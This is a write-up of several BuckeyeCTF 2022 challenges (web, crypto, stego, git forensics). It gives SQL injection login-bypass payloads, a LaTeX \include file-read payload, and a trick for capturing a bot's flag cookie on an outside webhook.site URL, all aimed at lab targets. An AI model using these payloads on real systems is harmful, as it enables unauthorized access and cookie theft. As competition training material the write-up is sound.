
 # BuckeyeCTF 2022 WriteUp
BuckeyeCTF is jeopardy-style CTF hosted by the [Cybersecurity Club at The Ohio State University](https://osucyber.club/).

## > buckeyenotes (web)

Note taking apps are all the rage lately but turns our they're harder to make than I thought :/. Even in development buckeyenotes has gotten some traction, Brutus signed up! I think his user name is brutusB3stNut9999. I wonder what kind of notes he writes 🤔 but I don't have his login....

### Steps
We are prompted with a login form. From the description, we know Brutu's id but not the password. Hence, we can try to do SQL injection. <br>
First payload: ``admin' or 1=1/*`` <br>
With this payload, we are succesfully logged with other user's account. What we want is Brutus account. <br>

Final payload: ``brutusB3stNut9999' /*`` <br>
```
Flag: buckeye{wr1t3_ur_0wn_0p3n_2_pwn}
```

## > textual (web)
I made a LaTeX to HTML converter. Why? Because I believe in more than WYSIWYG. Don't worry though, it's totally safe!
Target: [https://textual.chall.pwnoh.io](https://textual.chall.pwnoh.io/)

### Steps
Given a .tex file:
```
\documentclass{article}
\title{BuckeyeCTF 2022}
\author{v0rtex}
\date{November, 2022}
\begin{document}
\maketitle
\section{The challenge}
Nobody is ever going to be able to see this document, so it's a good thing I decided to hide the flag in here! $buckeye{this_is_a_fake_flag}$
\end{document}
```
After some googling, I found that we can include the file itself to the commands with ``\include{}``. Notice that there is a dollar sign which may represent a variable.
Payload:
```
\include{flag.tex}
\documentclass{article}
\begin{document}
\end{document}
```
```
Flag: buckeye{w41t_3v3n_l4t3x_15_un54f3}
```

## > owl (web)
This bird never goes ANYWHERE without its flag, but is your site hootin' enough?  `owl#9960`

### Steps
Given an index.js, we are supposed to give a payload to a discord bot.
```
const discord = require("discord.js");
const Browser = require("zombie");
const client = new discord.Client();
client.login(process.env.DISCORD_TOKEN);
const browser = new Browser();

function fly(url, content) {
	let bad = /<script[\s\S]*?>[\s\S]*?<\/script>/gi;
	return new Promise((resolve, reject) => {
		if(content.match(bad)) {
			resolve("hoot hoot!! >:V hoot hoot hoot hoot");
			return;
		}
	
		if(content.includes("cookie")) {
			resolve("hoooot hoot hoot hoot hoot hoot");
			return;
		}
	
		browser.visit(url, () => {
			let html = browser.html();
			if(html.toLowerCase().includes("owl")) {
				resolve("✨🦉 hoot hoot 🦉✨");
			} else {
				resolve("");
			}
		});
	})
}

function scout(url, host) {
	return new Promise((resolve, reject) => {
		if(!url.includes("owl")) {
			resolve("hoot... hoot hoot?");
			return;
		}

		browser.setCookie({
			name: "flag",
			domain: host,
			value: process.env.FLAG
		});

		browser.fetch(url).then(r => {
			return r.text();
		}).then(t => {
			return fly(url, t);
		}).then(m => {
			resolve(m);
		});
	});
}

client.on("ready", () => {
	console.log("Logged in as " + client.user.tag);
});

client.on("message", msg => {
	if(!(msg.channel instanceof discord.DMChannel))
		return;

	let url = /https?:\/\/(www\.)?([-a-zA-Z0-9@:%._\+~#=]{1,256}\.[a-zA-Z0-9()]{1,6}\b)([-a-zA-Z0-9()@:%_\+.~#?&//=]*)/i
	let match = msg.content.match(url);
	if(match) {
		scout(match[0], match[2]).then(res => {
			if(res.length > 0) {
				msg.channel.send(res);
			}
		});
	} else {
		if(msg.content.toLowerCase().includes("owl") || msg.mentions.has(client.user.id)) {
			msg.channel.send("✨🦉 hoot hoot 🦉✨");
		}
	}
});
```
Normally we are asked to craft a payload and bypass the regex. But this time it asked to be matched ``if(match)``.  <br>
I also need to include "owl" in the payload because of this  ``if(!url.includes("owl"))``. <br>
The flag is set into a cookie so I have to make a webhook using [webhook.site](https://webhook.site/). 
Payload:
```
https://webhook.site/c9dcea90-69c1-40a4-ba1f-0b378de0a8ef/owl
```
Since the regex is match and "owl" is included, we can see the flag placed in cookie header in the webhook site.<br>
![image](https://user-images.githubusercontent.com/63649797/200321320-f62b6fb3-7df0-4d53-aa61-4190ee9d44c1.png)
```
Flag: buckeye{7h3_m0r3_17_5335_7h3_1355_17_h0075}
```

## > pong (web)
I dug up my first ever JavaScript game, but this time, my AI is unbeatable!! Hah!

### Steps
We are given a classic web ping-pong JavaScript game. Since JavaScript is a client-side language, we can change the value of some variables that is used in the game. From the source code, we can see some variables like s1, s2, p1, p2, bx, by. <br>
``s1`` is score user 1. <br>
``p1`` is the bat. <br>
``bx`` is the ball location on x-axis, vice versa. <br>

After trying all the variables, I found out that I can control the score and the ball's position. Change the score value to win didn't give me the flag. Then I tried to change the ball's x-position, beyond the enemy's bat. I got the flag! <br>

![image](https://user-images.githubusercontent.com/63649797/200321617-4cc62a67-12d2-4fab-8db1-8e9fedf661dd.png)

## > megaxord (crypto)
Some pesky wizard stole the article I was writing. I got it back, but it's all messed up now :( <br>
Hint: the wizard used the same magic on every character...

### Steps
Given a long txt file:
```
7/=*x
96?=*+x1+x96x5=*1;96x=6,=*,9165=6,x96<x5=*;096<1+16?x>*96;01+=x:-14,x9*7-6<x9x41.=u9;,176x+-(=*0=*7x,=4=.1+176x+=*1=+tx:9+=<x76x,0=x9(96=+=x,73-+9,+-x>*96;01+=x-(=*x=6,91vx*7<-;=<x>1*+,x:!x9:96x6,=*,9165=6,tx+=;76<x:!xx6,=*,9165=6,tx49,=*x:!x9:96x*96<+tx96<x,7<9!x:!xx7/=*x
```
and more... <br>
From the title it pretty much obvious that the challenge related to XOR operation. Using Cyberchef, I can bruteforce the ciphertext and got a hit with key hex 58. Decrypt all with the same key and we get the flag.

```
Flag: buckeye{m1gh7y_m0rph1n_w1k1p3d14_p4g3}
```

## > sus (misc/forensic/stego)
Something about this audio is pretty  _sus_... <br>
Hint: The crackling in the audio should tell you that something's wrong.

### Steps
Given a sus.wav audio file. There are a lot of possibilities of to approach this kind of challenge. I tried binwalk which gave me a false positive of many MySQL MASIM file. I tried steghide and wavsteg which results nothing. Until I found an article about LSB algorithm in audio steganography. The output of this approach resulting noticeable noise/crack in the audio file (which been told in the challenge's hint), and so this must be a hit. <br>
I used the python code given in the article as below:

```
# Use wave package (native to Python) for reading the received audio file
import wave
song = wave.open("sus.wav", mode='rb')

# Convert audio to byte array
frame_bytes = bytearray(list(song.readframes(song.getnframes())))

# Extract the LSB of each byte
extracted = [frame_bytes[i] & 1 for i in range(len(frame_bytes))]

# Convert byte array back to string
string = "".join(chr(int("".join(map(str,extracted[i:i+8])),2)) for i in range(0,len(extracted),8))

# Cut off at the filler characters
decoded = string.split("###")[0]

# Print the extracted text
print("Sucessfully decoded: "+decoded)
song.close()
```
```
Flag: buckeye{4y000_p1nk_100k1n_k1nd4_5u5_th0}
```

### Reference
https://sumit-arora.medium.com/audio-steganography-the-art-of-hiding-secrets-within-earshot-part-2-of-2-c76b1be719b3
https://github.com/x41x41x41/hackingpotato/blob/master/techniques/stenography.md

## > what-you-see-is-what-you-git (misc)
I definitely made a Git repo, but I somehow broke it. Something about not getting a HEAD of myself.

### Steps
We are given a .git folder. First thing to do is to see the logs file to see any useful hint. It shows 3 commits (1 initial commit and other 2 commits). Using ``git show`` followed by the hash commit, we can see the changes. <br>
![image](https://user-images.githubusercontent.com/63649797/200321921-6a8c041b-dcd0-45cd-b5f3-abd49dd9c2ea.png)
```
Flag: buckeye{G1t_w@S_N@m3D_afT3r_Torvalds}
```
### Reference
https://infosecwriteups.com/tryhackme-git-happens-writeup-c6199984502e

## > keyboardwarrior (misc/forensic)

https://siunam321.github.io/ctf/BuckeyeCTF-2022/Misc/keyboardwarrior/

## > quizbot (misc)
https://github.com/Phil-ip-M/CTF-writeups-DIG174L/blob/main/Web/quizbot.md
